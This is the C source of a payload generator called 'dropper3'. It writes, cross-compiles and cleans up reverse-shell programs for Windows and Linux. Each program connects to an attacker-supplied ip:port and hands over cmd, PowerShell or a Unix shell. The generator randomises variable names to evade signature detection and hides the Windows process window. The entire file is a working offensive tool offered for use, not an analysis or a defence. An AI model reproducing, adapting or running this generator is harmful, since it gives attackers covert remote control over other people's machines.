#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <getopt.h>
#include <time.h>
#include <sys/wait.h>
//Set PATH_MAX for working directory
#ifndef PATH_MAX
#define PATH_MAX 200
#endif
//Begin Random String Generation Function
const char *string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
char *randString(int length) {
    srand(time(NULL));
	const size_t string_length = 52;
	char *result = malloc(sizeof(char) * (length +1));
	if(!result) {
		return (char*)0;
	}
	unsigned int key = 0;
	for(int index = 0;index<length;index++) {
		key = rand() % string_length;
		result[index] = string[key];
	}
	result[length] = '\0';
	return result;
}
//Begin Usage Display
void print_usage() {
    printf("Usage: Usage of dropper3:\n");
    printf("  -a string\n");
    printf("\t\tArchitecture: i686, amd64, arm, arm64, powerpc64, powerpc, mips, mips64, s390x, sparc64, riscv64, hppa, hppa64, alpha\n");
    printf("  -l string\n");
    printf("\t\tListening host: <listening ip:port>\n");
    printf("  -o string\n");
    printf("\t\tOutput filename: <anything goes>\n");
    printf("  -p string");
    printf("\t\tOperating System: windows, linux\n");
    printf("  -s string\n");
    printf("\t\tShell type: cmd, powershell, /bin/sh, /bin/bash, /usr/bin/zsh, /system/bin/sh, /bin/busybox\n");
    //printf("  -t string");
    //printf("\t\tPayload type: bind/reverse\n");
}
//Begin Main
int main(int argc, char *argv[]) {
    if (argc < 1 || argc == 0) {
        print_usage();
        exit(EXIT_FAILURE);
    }
    char opt;
    const char *arch, *listener, *outfile, *platform, *shell, *ptype;   
    //Argument Struct
    static struct option long_options[] = {
        {"arch",      required_argument,       0,  'a' },
        {"listener", required_argument,       0,  'l' },
        {"outfile",    required_argument, 0,  'o' },
        {"platform",   required_argument, 0,  'p' },
        {"shell",   required_argument, 0,  's' },
        //{"ptype",   required_argument, 0,  't' },
        {0,           0,                 0,  0   }
    };

    int long_index =0;
    while ((opt = getopt_long(argc, argv,"a:l:o:p:s:h", //t
                   long_options, &long_index )) != -1) {
        switch (opt) {
            case 'a' : printf("Architecture: %s\n", optarg);
                arch = optarg;
                 break;
            case 'l' : printf("Listening host: %s\n", optarg);
                listener = optarg;
                 break;
            case 'o' : printf("Output filename: %s\n", optarg);
                outfile = optarg; 
                 break;
            case 'p' : printf("Operating System: %s\n", optarg);
                platform = optarg;
                 break;
            case 's' : printf("Shell type: %s\n", optarg);
                shell = optarg;
                 break;
            //case 't' : printf("Payload type: %s\n", optarg);
            //    ptype = optarg;
            //     break;
            case 'h': print_usage();
                exit(0);
             default: print_usage(); 
                 exit(EXIT_FAILURE);
        }
    }

    srand(time(NULL));
    // Generate random number
    int z = rand()%32 + 3;
    //Generate random C filename
    char *randfilename;
    randfilename=randString(z);
    char *rndfname = randfilename;
    char *ext = ".";
    char *tention = "c";
    strcat(rndfname, ext);
    strcat(rndfname, tention);
    //BEGIN Listener argument splitting
    if (strcmp(platform, "windows") == 0){
        //printf("Platform is: %s\n", platform);
        // Randomize Variables
        char archcompiler[128];
        if (strcmp(arch, "i686") == 0) {
            strcpy(archcompiler, "/usr/bin/i686-w64-mingw32-gcc-win32");
        } else if (strcmp(arch, "amd64") == 0) {
            strcpy(archcompiler, "/usr/bin/x86_64-w64-mingw32-gcc-win32");
        } else {
            printf("Bad Combination: Windows only supports 'amd64' and 'i686'\n");
            exit(1);
        }
        srand(time(NULL));
        int y = rand()%22 + 2;
        int x = rand()%13 + 2;
        int w = rand()%16 + 2;
        int v = rand()%27 + 2;
        int u = rand()%19 + 2;
        int t = rand()%11 + 2;
        int s = rand()%29 + 2;
        char *wsaData=randString(y);
        char *portvar=randString(x);
        char *ipaddrvar=randString(w);
        char *savar=randString(v);
        char *sockt=randString(u);
        char *sinfo=randString(t);
        char *pinfo=randString(s);
        char wipaddr[128];
        char *wprt;
        strcpy(wipaddr, listener);
        strtok_r(wipaddr, ":", &wprt);
        //printf("%s %s",ipaddr, prt);
        char wbuf[4028];
        //BEGIN Payload format - windows
        //char winshell[1280]="#include <winsock2.h>\n#include <windows.h>\n#include <io.h>\n#include <process.h>\n#include <sys/types.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(void) {\n\tWSADATA wsaData;\n\tif (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {\n\t\twrite(2, \"[ERROR] WSASturtup failed.\\n\", 27);\n\t\treturn (1);\n\t}\n\tint port = 1337;\n\tchar *addr = \"10.0.0.97\";\n\tstruct sockaddr_in sa;\n\tSOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n\tsa.sin_family = AF_INET;\n\tsa.sin_port = htons(port);\n\tsa.sin_addr.s_addr = inet_addr(addr);\n\tif (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {\n\t\twrite(2, \"[ERROR] connect failed.\\n\", 24);\n\t\treturn (1);}\n\tSTARTUPINFO sinfo;\n\tmemset(&sinfo, 0, sizeof(sinfo));\n\tsinfo.cb = sizeof(sinfo);\n\tsinfo.dwFlags = (STARTF_USESTDHANDLES);\n\tsinfo.hStdInput = (HANDLE)sockt;\n\tsinfo.hStdOutput = (HANDLE)sockt;\n\tsinfo.hStdError = (HANDLE)sockt;\n\tPROCESS_INFORMATION pinfo;\n\tCreateProcessA(NULL, \"cmd\", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);\n\treturn (0);\n}";
        snprintf(wbuf, sizeof(wbuf), "#include <winsock2.h>\n#include <windows.h>\n#include <io.h>\n#include <process.h>\n#include <sys/types.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(void) {\n\tWSADATA %s;\n\tif (WSAStartup(MAKEWORD(2 ,2), &%s) != 0) {\n\t\twrite(2, \"No WSAStartup.\\n\", 15);\n\t\treturn (1);\n\t}\n\tint %s = %s;\n\tchar *%s = \"%s\";\n\tstruct sockaddr_in %s;\n\tSOCKET %s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n\t%s.sin_family = AF_INET;\n\t%s.sin_port = htons(%s);\n\t%s.sin_addr.s_addr = inet_addr(%s);\n\tif (connect(%s, (struct sockaddr *) &%s, sizeof(%s)) != 0) {\n\t\twrite(2, \"connect failed.\\n\", 17);\n\t\treturn (1);}\n\tSTARTUPINFO %s;\n\tmemset(&%s, 0, sizeof(%s));\n\t%s.cb = sizeof(%s);\n\t%s.dwFlags = (STARTF_USESTDHANDLES);\n\t%s.hStdInput = (HANDLE)%s;\n\t%s.hStdOutput = (HANDLE)%s;\n\t%s.hStdError = (HANDLE)%s;\n\tPROCESS_INFORMATION %s;\n\tCreateProcessA(NULL, \"%s\", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &%s, &%s);\n\treturn (0);\n}", wsaData, wsaData, portvar, wprt, ipaddrvar, wipaddr, savar, sockt, savar, savar, portvar, savar, ipaddrvar, sockt, savar, savar, sinfo, sinfo, sinfo,sinfo, sinfo, sinfo, sinfo, sockt, sinfo, sockt, sinfo, sockt, pinfo, shell, sinfo, pinfo);
        //BEGIN Build payload - windows
        char wcwd[PATH_MAX];
        if (getcwd(wcwd, sizeof(wcwd)) != NULL) {
            //printf("Current working dir: %s\n", wcwd);
        } else {
            perror("getcwd() error");
        }
        char worigin[1048];
        strcpy(worigin, "/tmp/");
        strcat(worigin, rndfname);
        //printf("%s\n", worigin);
        char wdestination[1048];
        strcpy(wdestination, wcwd);
        strcat(wdestination, "/");
        strcat(wdestination, outfile);
        FILE *wfptr;
        wfptr = fopen(worigin, "w");
        fprintf(wfptr, "%s", wbuf);
        //printf("Payload written successfully to %s.\n", worigin);
        fclose(wfptr);
        char *wcommand[] = {archcompiler, "-std=c99", "-o", wdestination, worigin, "-lws2_32", 0};
        int pid = fork();
        if (!pid) {
            execvp(wcommand[0], wcommand);
        }
        waitpid(pid, NULL, 0);
        printf("Payload built successfully\n");
        //Remove artifact
        if (remove(worigin) == 0) {
            //printf("Artifact: %s deleted successfully.\n", worigin);
        } else {
            printf("Unable to delete artifact: %s\n", worigin);
        }
    }
    else if (strcmp(platform, "linux") == 0){
        //printf("Penguin's love you for using: %s\n", platform);

        char archcompiler[128];
        if (strcmp(arch, "i686") == 0) {
            strcpy(archcompiler, "/usr/bin/i686-linux-gnu-gcc");
        } else if (strcmp(arch, "amd64") == 0) {
            strcpy(archcompiler, "/usr/bin/x86_64-linux-gnu-gcc");
        } else if (strcmp(arch, "arm") == 0) {
            strcpy(archcompiler, "/usr/bin/arm-linux-gnueabi-gcc");
        } else if (strcmp(arch, "arm64") == 0) {
            strcpy(archcompiler, "/usr/bin/aarch64-linux-gnu-gcc");
        } else if (strcmp(arch, "powerpc64") == 0) {
            strcpy(archcompiler, "/usr/bin/powerpc64-linux-gnu-gcc");
        } else if (strcmp(arch, "powerpc") == 0) {
            strcpy(archcompiler, "/usr/bin/powerpc-linux-gnu-gcc");
        } else if (strcmp(arch, "mips") == 0) {
            strcpy(archcompiler, "/usr/bin/mips-linux-gnu-gcc");
        } else if (strcmp(arch, "mips64") == 0) {
            strcpy(archcompiler, "/usr/bin/mips64-linux-gnuabi64-gcc");
        } else if (strcmp(arch, "s390x") == 0) {
            strcpy(archcompiler, "/usr/bin/s390x-linux-gnu-gcc");
        } else if (strcmp(arch, "sparc64") == 0) {
            strcpy(archcompiler, "/usr/bin/sparc64-linux-gnu-gcc");
        } else if (strcmp(arch, "riscv64") == 0) {
            strcpy(archcompiler, "/usr/bin/riscv64-linux-gnu-gcc");
        } else if (strcmp(arch, "hppa") == 0) {
            strcpy(archcompiler, "/usr/bin/hppa-linux-gnu-gcc");
        } else if (strcmp(arch, "hppa64") == 0) {
            strcpy(archcompiler, "/usr/bin/hppa64-linux-gnu-gcc");
        } else if (strcmp(arch, "alpha") == 0) {
            strcpy(archcompiler, "/usr/bin/alpha-linux-gnu-gcc");
        } else {
            printf("Bad Combination: Something is not correct with your chosen architecture.\n");
            exit(1);
        }
        // Randomize Variables
        srand(time(NULL));
        int r = rand()%32 + 2;
        int q = rand()%29 + 2;
        int p = rand()%11 + 2;
        int o = rand()%17 + 2;
        char *pidvar=randString(r);
        char *savar=randString(q);
        char *socktvar=randString(p);
        char *argvar=randString(o);
        char ipaddr[128];
        char *prt;
        strcpy(ipaddr, listener);
        strtok_r(ipaddr, ":", &prt);
        char buf[4028];
        //BEGIN Payload format - *nix
        snprintf(buf, sizeof(buf), "#include <sys/socket.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <sys/types.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main(void) {\n\tpid_t %s = fork();\n\tif (%s == -1) {\n\t\twrite(2, \"No forks, only spoons.\\n\", 21);\n\t\treturn (1);\n\t}\n\tif (%s > 0) {\n\t\treturn (0);\n\t}\n\tstruct sockaddr_in %s;\n\t%s.sin_family = AF_INET;\n\t%s.sin_port = htons(%s);\n\t%s.sin_addr.s_addr = inet_addr(\"%s\");\n\tint %s = socket(AF_INET, SOCK_STREAM, 0);\n\tif (connect(%s, (struct sockaddr *) &%s, sizeof(%s)) != 0) {\n\t\twrite(2, \"What is life?\\n\", 15);\n\t\treturn (1);\n\t}\n\tdup2(%s, 0);\n\tdup2(%s, 1);\n\tdup2(%s, 2);\n\tchar * const %s[] = {\"%s\", NULL};\n\texecve(\"%s\", %s, NULL);\n\treturn (0);\n}", pidvar, pidvar, pidvar, savar, savar, savar, prt, savar, ipaddr, socktvar, socktvar, savar, savar, socktvar, socktvar, socktvar, argvar, shell, shell, argvar);
        char cwd[PATH_MAX];
        if (getcwd(cwd, sizeof(cwd)) != NULL) {
            //printf("Current working dir: %s\n", cwd);
        } else {
            perror("getcwd() error");
        }

        char origin[1048];
        strcpy(origin, "/tmp/");
        strcat(origin, rndfname);
        //printf("%s\n", origin);
        char destination[1048];
        strcpy(destination, cwd);
        strcat(destination, "/");
        strcat(destination, outfile);
        FILE *fptr;
        fptr = fopen(origin, "w");
        fprintf(fptr, "%s", buf);
        //printf("Payload written successfully to %s.\n", origin);
        fclose(fptr);
        char *command[] = {archcompiler, "-o", destination, origin, 0};
        int pid = fork();
        if (!pid) {
            execvp(command[0], command);
        }
        waitpid(pid, NULL, 0);
        printf("Payload built successfully\n");
        //Remove artifact
        if (remove(origin) == 0) {
            //printf("Artifact: %s deleted successfully.\n", origin);
        } else {
            printf("Unable to delete artifact: %s\n", origin);
        }
    }
    else {
        printf("Something's broken.\n");
    }
    return 0;
}